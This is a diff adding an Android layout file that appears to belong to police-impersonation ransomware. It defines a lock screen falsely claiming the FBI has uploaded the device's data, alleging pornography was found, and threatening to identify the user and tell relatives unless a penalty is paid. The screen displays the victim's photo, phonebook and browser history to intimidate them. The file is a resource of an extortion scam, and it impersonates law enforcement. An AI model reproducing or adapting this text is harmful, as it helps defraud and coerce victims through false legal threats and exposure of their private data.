@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout android:gravity="fill_horizontal" android:orientation="vertical" android:id="@id/deedra4" android:background="#ffffffff" android:visibility="gone" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_alignParentLeft="true"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent">
+        <TextView android:textSize="@dimen/a12sp" android:textColor="#ff000000" android:gravity="left" android:paddingBottom="@dimen/a8dp" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="All information listed below successfully uploaded on the FBI Cyber Crime Department's Datacenter \n In the case of non-payment of the penalty within the specified period, your personalty will be identified based on the available data obtained from your device. In accordance with the laws of the United States of America, your relatives and close associates will be informed by the authorized FBI agents." android:textAllCaps="true" />
+        <TextView android:textSize="@dimen/a12sp" android:textStyle="bold" android:textColor="#ff000000" android:gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Information about device:" android:textAllCaps="true" />
+        <include android:layout_width="wrap_content" android:layout_height="wrap_content" layout="@layout/data" />
+        <TextView android:textSize="@dimen/a12sp" android:textStyle="bold" android:textColor="#ff000000" android:gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Found pornography on your device:" android:textAllCaps="true" />
+        <ImageView android:layout_gravity="center_horizontal" android:layout_width="wrap_content" android:layout_height="wrap_content" android:src="@drawable/wowow" android:scaleType="centerCrop" />
+    </LinearLayout>
+    <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="fill_parent" android:layout_weight="1.0">
+        <TextView android:textSize="@dimen/a12sp" android:textStyle="bold" android:textColor="#ff000000" android:gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Information about user:" android:textAllCaps="true" />
+        <ImageView android:layout_gravity="center_horizontal" android:id="@id/usr" android:layout_width="wrap_content" android:layout_height="wrap_content" android:scaleType="centerCrop" />
+        <TextView android:textSize="@dimen/a12sp" android:textStyle="bold" android:textColor="#ff000000" android:gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Phonebook: " android:textAllCaps="true" />
+        <TextView android:textSize="@dimen/a12sp" android:textColor="#ff000000" android:gravity="left" android:id="@id/phonebook" android:paddingBottom="@dimen/a8dp" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="" android:textAllCaps="true" />
+        <TextView android:textSize="@dimen/a12sp" android:textStyle="bold" android:textColor="#ff000000" android:gravity="center_horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Browser history: " android:textAllCaps="true" />
+        <TextView android:textSize="@dimen/a12sp" android:textColor="#ff000000" android:gravity="left" android:id="@id/bulgariya" android:paddingBottom="@dimen/a8dp" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="" android:textAllCaps="true" />
+    </LinearLayout>
+</LinearLayout>
